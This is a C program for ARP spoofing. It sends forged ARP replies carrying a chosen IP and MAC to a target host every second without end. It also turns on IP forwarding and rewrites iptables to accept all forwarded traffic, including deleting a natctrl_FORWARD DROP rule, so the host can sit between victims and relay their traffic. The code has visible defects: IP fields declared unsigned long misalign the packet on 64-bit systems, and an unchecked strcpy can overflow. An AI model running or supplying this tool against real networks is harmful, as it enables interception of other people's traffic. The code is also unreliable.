#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

#include <netinet/if_ether.h>
#include <net/if_arp.h>

#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include <net/if.h>   // ?
#include <netpacket/packet.h>
#include <sys/ioctl.h>

struct  my_arp_packet{
    unsigned char h_dest[ETH_ALEN];	       /* destination eth addr */
    unsigned char h_source[ETH_ALEN];	   /* source ether addr */
    unsigned short h_proto;                /* packet type ID field */


    unsigned short int ar_hrd;		       /* Format of hardware address.  */
    unsigned short int ar_pro;             /* Format of protocol address.  */
    unsigned char ar_hln;		 	       /* Length of hardware address.  */
    unsigned char ar_pln;				   /* Length of protocol address.  */
    unsigned short int ar_op;			   /* ARP opcode (command).  */
    unsigned char ar_sha[ETH_ALEN];        /* Sender hardware address.  */
    unsigned long ar_sip;				   /* Sender IP address.  */
    unsigned char ar_tha[ETH_ALEN];	       /* Target hardware address.  */
    unsigned long ar_tip;				   /* Target IP address.  */
} __attribute__((packed));


void listen_arp_requests(){

}

void arp_reply_send(char *iface_name, unsigned long src_ip, unsigned char *src_mac, unsigned int dest_ip, unsigned char *dest_mac){
    struct my_arp_packet arp;

    memcpy(arp.h_dest,dest_mac,ETH_ALEN);
    memcpy(arp.h_source,src_mac,ETH_ALEN);
    arp.h_proto=htons(ETH_P_ARP);

    arp.ar_hln = ETH_ALEN;
    arp.ar_pln = 4;
    arp.ar_hrd = htons(ARPHRD_ETHER);
    arp.ar_pro = htons(ETH_P_IP);
    arp.ar_op = htons(ARPOP_REPLY);
    memcpy(arp.ar_sha,src_mac,ETH_ALEN);
    memcpy(arp.ar_tha,dest_mac,ETH_ALEN);
    arp.ar_sip=src_ip;
    arp.ar_tip=dest_ip;

    int sock = socket(PF_PACKET, SOCK_PACKET, htons(ETH_P_ARP));
    if (sock == -1) {
        printf("Socket creation failed");
        fflush(stdout);
        return;
    }

    struct sockaddr adr;
    if (strncpy(adr.sa_data, iface_name, sizeof(adr.sa_data) - 1) == NULL) {
        printf("Interface name copy failed");
        fflush(stdout);
        close(sock);
        return;
    }

    strcpy(adr.sa_data, iface_name);
    adr.sa_family = AF_INET;

    //sendto(sock, (void*)&arp, sizeof(struct my_arp_packet), 0, (struct sockaddr *)&adr, sizeof(struct sockaddr));
    if (sendto(sock, (void*)&arp, sizeof(struct my_arp_packet), 0, (struct sockaddr*)&adr, sizeof(struct sockaddr)) == -1) {
        printf("Failed to send ARP packet");
        fflush(stdout);
        close(sock);
        return;
    }

    printf("ARP reply sent successfully\n");
    fflush(stdout);
    close(sock);
}

void str_to_mac(unsigned char mac[ETH_ALEN],const char *str){
    int i;
    char *token, *ptr;
    char *copy = strdup(str);

    token = strtok(copy, ":");

    for (i = 0; i < ETH_ALEN; i++) {
        mac[i] = strtol(token, &ptr, 16);
        token = strtok(NULL, ":");
    }

    free(copy);
}

int main(int argc, char **argv){
    printf("START\n\n");
    printf("Interface = %s\nsrc_ip = %s\nsrc_mac = %s\ndest_ip = %s\ndest_mac = %s\n", argv[1], argv[2], argv[3], argv[4], argv[5]);
    fflush(stdout);

    char *my_interface = argv[1]; // interface name

    unsigned long dest_ip=inet_addr(argv[4]);
    unsigned long src_ip=inet_addr(argv[2]);

    unsigned char dest_mac[ETH_ALEN];
    unsigned char src_mac[ETH_ALEN];

    str_to_mac(dest_mac, argv[5]);
    str_to_mac(src_mac, argv[3]);

    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    system("iptables -A FORWARD -j ACCEPT");

    system("iptables -D natctrl_FORWARD -j DROP");
    system("iptables -A natctrl_FORWARD -j ACCEPT");

    printf("\n");
    fflush(stdout);

    while(1){
        arp_reply_send(my_interface, src_ip, src_mac, dest_ip, dest_mac);
        sleep(1);
    }
}